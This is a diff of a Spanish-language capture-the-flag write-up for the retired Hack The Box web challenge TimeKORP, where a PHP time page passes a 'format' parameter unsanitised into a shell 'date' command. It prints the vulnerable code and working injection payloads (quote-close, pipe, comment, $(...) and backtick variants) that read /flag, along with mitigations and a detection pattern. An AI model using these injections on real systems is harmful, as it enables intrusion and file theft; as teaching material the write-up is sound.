@@ -10,75 +10,68 @@ type: Web
 
 # TimeKORP — Hack The Box
 
-[🇬🇧 English](README.en.md) | **Español**
+[⚑ English](README.en.md) | **Español**
 
-> **Estado:** Retired. Ficha de método; sin flags reales.
+> **Estado:** Retired (Cyber Apocalypse 2024). Ficha de método; sin flags reales.
 
 ## TL;DR
 
-Una web que muestra la hora según un **formato** que llega por parámetro. El servidor construye una **orden de shell** con ese valor sin sanear: basta añadir `;` para ejecutar lo que se quiera. El código fuente viene con el reto, así que la vulnerabilidad se ve a la primera.
+Una web que muestra la hora según un parámetro `format`. En PHP, el controlador pasa ese valor a un modelo que construye una orden de shell con `date` **sin sanear**; el parámetro acaba dentro de comillas simples, así que se cierra la comilla, se encadena con `|` y se comenta el resto. Con el código fuente del reto a la vista, la inyección se ve en dos líneas.
 
 ## Enunciado y superficie
 
-- Categoría Web; el reto entrega el material descrito en «Reconocimiento».
+- Categoría Web. Se entrega el código (`TimeController.php`, `TimeModel.php`) y un `Dockerfile`; la instancia sirve una única página que muestra la hora.
+- El `Dockerfile` copia la flag a `/flag`: el objetivo es leer un fichero del sistema, no escalar.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
+```bash
+curl -s "http://<IP>:<PORT>/"
+# 14:32:07
+curl -s "http://<IP>:<PORT>/?format=H"
+# 14
+```
+
+El parámetro `format` cambia la salida, señal de que se pasa tal cual a `date`.
 
 ## Análisis del código
 
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
+```php
+// TimeModel.php
+$this->command = "date '" . $this->format . "' 2>&1";
+// ...
+return shell_exec($this->command);
+```
 
-## Explicación del fallo
-
-Una web que muestra la hora según un **formato** que llega por parámetro. El servidor construye una **orden de shell** con ese valor sin sanear: basta añadir `;` para ejecutar lo que se quiera. El código fuente viene con el reto, así que la vulnerabilidad se ve a la primera.
-
-## Reproducción local
-
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
+El valor va entre **comillas simples** dentro de una orden de shell. No hay `escapeshellarg` ni lista blanca de formatos: cualquier metacaracter del shell se interpreta.
 
 ## Explotación
 
-- Ver las secciones adyacentes para el detalle.
+Cerrar la comilla, encadenar con `|` y comentar el `2>&1` con `#`:
+
+```text
+/?format=%H:%M:%S' |cat /flag #
+```
+
+```bash
+curl -s "http://<IP>:<PORT>/?format=%H%3A%M%3A%S%27%20%7Ccat%20%2Fflag%20%23"
+```
+
+El `#` no es decorativo: sin él, `2>&1` sigue en la orden y la salida de `cat` se redirige, así que el flag no aparece.
 
 ## Evidencia
 
-- Instancia web y (según la versión del reto) el código PHP de la aplicación.
+- Instancia web y código PHP del reto; en el informe, la orden construida (`date '%H:%M:%S'' |cat /flag # 2>&1`), no el flag.
 
-## Lecciones aprendidas
+## Lecciones
 
-- **Codificar la URL**: `;` y espacios deben ir codificados (`%3B`, `%20`) según el cliente.
-- **Comillas**: si el valor se interpola entre comillas simples, hay que cerrarlas antes del `;`.
-- **Salida vacía**: probar `id` o `whoami` antes de asumir que no hay inyección.
-
-- Interpolar entrada del usuario en una orden de shell es inyección de comandos, aunque "sólo" sea un formato de fecha.
-- El código fuente en el reto elimina la fase de adivinación.
-- `escapeshellarg` y listas de formatos permitidos son la defensa.
+- Interpolar entrada del usuario en una orden de shell es inyección de comandos aunque «sólo» sea un formato de fecha.
+- En una orden entre comillas simples el ataque es `'` + separador, no `;` a secas; el `#` final evita la redirección.
+- Codificar la URL (`%27`, `%7C`, `%23`, `%20`) es obligatorio con `curl`.
+- `escapeshellarg()` y una lista de formatos permitidos son la defensa; mejor aún, usar la API de fecha del lenguaje sin pasar por el shell.
 
 ## Mitigaciones y detección
 
-- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
-- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.
-
-## Método
-
-1. **Ver el parámetro**: la URL del tipo `?format=%H:%M` devuelve la hora formateada.
-
-2. **Leer el código** si está disponible: aparece algo como
-
-```php
-$format = $_GET['format'] ?? 'H:i:s';
-return shell_exec("date +'$format'");
-```
-
-3. **Inyectar**: cerrar la comilla y encadenar.
-
-```text
-?format=';cat /flag;'
-?format=';id;'
-```
-
-4. **Variantes** si hay filtro: `$(cat /flag)`, backticks o `%0a` para salto de línea.
-
-5. **Alternativa**: si el contenedor expone el `Dockerfile`, revela la ruta real de la flag.
+- No construir órdenes de shell: usar `DateTime::format()` en PHP, que no ejecuta nada.
+- Si hay que llamar a un binario, `escapeshellarg` y validación de `format` contra un patrón (`^[a-zA-Z0-9:%-]+$`).
+- Detección: parámetros `format` con comillas, `|`, `;`, `$(` o `#`, y procesos `sh -c date ...` con `cat` en la línea.
